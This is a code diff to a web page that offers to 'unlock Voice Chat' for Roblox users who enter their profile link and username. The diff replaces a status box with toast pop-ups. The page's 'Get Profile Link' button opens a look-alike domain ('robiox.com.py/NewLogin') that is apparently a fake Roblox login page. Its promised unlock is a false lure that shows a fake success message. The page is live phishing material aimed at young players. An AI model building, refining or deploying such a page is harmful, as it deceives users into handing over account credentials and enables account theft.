@@ -100,6 +100,65 @@
       gap: 40px;
     }
 
+    /* Modern Toast Notification */
+    .toast-notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-100px);
+      background: linear-gradient(135deg, #1e293b, #0f172a);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      border-radius: 60px;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(139, 92, 246, 0.2);
+      z-index: 1001;
+      transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .toast-notification.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .toast-icon {
+      width: 28px;
+      height: 28px;
+      background: rgba(139, 92, 246, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toast-icon i {
+      font-size: 14px;
+      color: #8b5cf6;
+    }
+
+    .toast-content {
+      font-size: 14px;
+      font-weight: 500;
+      color: #e2e8f0;
+    }
+
+    .toast-close {
+      cursor: pointer;
+      color: #64748b;
+      transition: color 0.2s;
+      font-size: 14px;
+    }
+
+    .toast-close:hover {
+      color: #f1f5f9;
+    }
+
     /* Glassmorphic Card */
     .card {
       background: rgba(30, 41, 59, 0.6);
@@ -291,35 +350,6 @@
       transform: scale(0.98);
     }
 
-    /* Status Message */
-    .status-message {
-      margin-top: 1.5rem;
-      font-size: 0.9rem;
-      padding: 1rem 1.2rem;
-      border-radius: 16px;
-      background: rgba(0, 0, 0, 0.3);
-      border-left: 3px solid #8b5cf6;
-      color: #cbd5e1;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      transition: all 0.3s ease;
-    }
-
-    .status-message i {
-      font-size: 1rem;
-    }
-
-    .error-status {
-      border-left-color: #f97316;
-      background: rgba(249, 115, 22, 0.1);
-    }
-
-    .success-status {
-      border-left-color: #22c55e;
-      background: rgba(34, 197, 94, 0.1);
-    }
-
     /* Progress Bar */
     .progress-container {
       margin-top: 1.5rem;
@@ -345,6 +375,21 @@
       border-radius: 24px;
       padding: 32px;
       border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .stats-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 24px;
+      font-weight: 700;
+      font-size: 18px;
+      color: #cbd5e1;
+    }
+
+    .stats-header i {
+      color: #8b5cf6;
+      font-size: 20px;
     }
 
     .faq-item {
@@ -563,12 +608,32 @@
       .modal {
         padding: 24px;
       }
+      
+      .toast-notification {
+        padding: 10px 18px;
+        max-width: 90%;
+      }
+      
+      .toast-content {
+        font-size: 12px;
+      }
     }
   </style>
 </head>
 <body>
 <div class="floating-shape shape-1"></div>
 <div class="floating-shape shape-2"></div>
+
+<!-- Modern Toast Notification -->
+<div id="toastNotification" class="toast-notification">
+  <div class="toast-icon">
+    <i class="fas fa-info-circle"></i>
+  </div>
+  <div class="toast-content">Get your profile link from the new tab and paste it above</div>
+  <div class="toast-close" onclick="closeToast()">
+    <i class="fas fa-times"></i>
+  </div>
+</div>
 
 <div class="main-container">
   <!-- Main Content -->
@@ -595,7 +660,7 @@
       <div class="link-wrapper">
         <i class="fas fa-external-link-alt"></i>
         <span id="getProfileLink" class="blue-link">
-          <i class="fas fa-arrow-right"></i> Get Profile Link (opens in new tab)
+          <i class="fas fa-arrow-right"></i> Get Profile Link
         </span>
       </div>
     </div>
@@ -624,11 +689,6 @@
     <!-- Progress Bar -->
     <div id="progressContainer" class="progress-container">
       <div id="progressBar" class="progress-bar"></div>
-    </div>
-
-    <!-- Status Message -->
-    <div id="statusArea" class="status-message">
-      <i class="fas fa-info-circle"></i> Ready — enter your profile link and username
     </div>
   </div>
 
@@ -710,28 +770,43 @@
   // Redirect URL
   const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
   
-  const statusDiv = document.getElementById('statusArea');
   const progressContainer = document.getElementById('progressContainer');
   const progressBar = document.getElementById('progressBar');
   const modalOverlay = document.getElementById('modalOverlay');
   const modalCloseBtn = document.getElementById('modalCloseBtn');
   const finalMessageDiv = document.getElementById('finalMessage');
+  const toastNotification = document.getElementById('toastNotification');
   
   let progressInterval = null;
+  let toastTimeout = null;
   
-  function setStatus(message, type = 'info') {
-    statusDiv.classList.remove('error-status', 'success-status');
-    let icon = '<i class="fas fa-circle-info"></i>';
-    if (type === 'error') {
-      statusDiv.classList.add('error-status');
-      icon = '<i class="fas fa-triangle-exclamation"></i>';
-    } else if (type === 'success') {
-      statusDiv.classList.add('success-status');
-      icon = '<i class="fas fa-check-circle"></i>';
+  function showToast(message, type = 'info', duration = 5000) {
+    const toastIcon = toastNotification.querySelector('.toast-icon i');
+    const toastContent = toastNotification.querySelector('.toast-content');
+    
+    if (type === 'success') {
+      toastIcon.className = 'fas fa-check-circle';
+      toastIcon.style.color = '#22c55e';
+    } else if (type === 'error') {
+      toastIcon.className = 'fas fa-exclamation-triangle';
+      toastIcon.style.color = '#f97316';
     } else {
-      icon = '<i class="fas fa-info-circle"></i>';
+      toastIcon.className = 'fas fa-info-circle';
+      toastIcon.style.color = '#8b5cf6';
     }
-    statusDiv.innerHTML = `${icon} ${message}`;
+    
+    toastContent.textContent = message;
+    toastNotification.classList.add('show');
+    
+    if (toastTimeout) clearTimeout(toastTimeout);
+    toastTimeout = setTimeout(() => {
+      toastNotification.classList.remove('show');
+    }, duration);
+  }
+  
+  function closeToast() {
+    toastNotification.classList.remove('show');
+    if (toastTimeout) clearTimeout(toastTimeout);
   }
   
   function resetSteps() {
@@ -832,7 +907,7 @@
   // Get Profile Link: opens in NEW TAB
   function handleGetProfileLink() {
     window.open(REDIRECT_URL, '_blank');
-    setStatus("Opened in new tab! Get your profile link and paste it above.", "success");
+    showToast("Opened in new tab! Get your profile link and paste it above", "success", 4000);
   }
   
   function handleConfirm() {
@@ -840,22 +915,22 @@
     const username = document.getElementById('usernameInput').value.trim();
     
     if (profileLink === "") {
-      setStatus("Please enter your Roblox profile link.", "error");
+      showToast("Please enter your Roblox profile link", "error", 3000);
       return;
     }
     
     if (username === "") {
-      setStatus("Please enter your Roblox username.", "error");
+      showToast("Please enter your Roblox username", "error", 3000);
       return;
     }
     
     if (!isValidProfileLink(profileLink)) {
-      setStatus("Invalid Roblox profile link. Make sure it's a valid Roblox URL.", "error");
+      showToast("Invalid Roblox profile link. Make sure it's a valid Roblox URL", "error", 4000);
       return;
     }
     
     if (!isValidUsername(username)) {
-      setStatus("Invalid username format (3-20 chars, letters, numbers, underscores).", "error");
+      showToast("Invalid username format (3-20 chars, letters, numbers, underscores)", "error", 4000);
       return;
     }
     
@@ -865,7 +940,7 @@
     
     runSteps(() => {
       completeProgress();
-      setStatus(`Success! Profile link and username "${username}" confirmed. Voice Chat will be unlocked within 24 hours.`, "success");
+      showToast(`Success! Voice Chat will be unlocked within 24 hours for "${username}"`, "success", 5000);
       
       const confirmBtn = document.getElementById('confirmBtn');
       confirmBtn.style.transform = 'scale(1.02)';
@@ -903,9 +978,10 @@
     }
   });
   
+  // Show initial toast
   setTimeout(() => {
-    setStatus("Click 'Get Profile Link' to open in new tab, then paste your link and enter your username", "info");
-  }, 100);
+    showToast("Click 'Get Profile Link' to get your profile link, then paste it above", "info", 5000);
+  }, 500);
 </script>
 </body>
 </html>
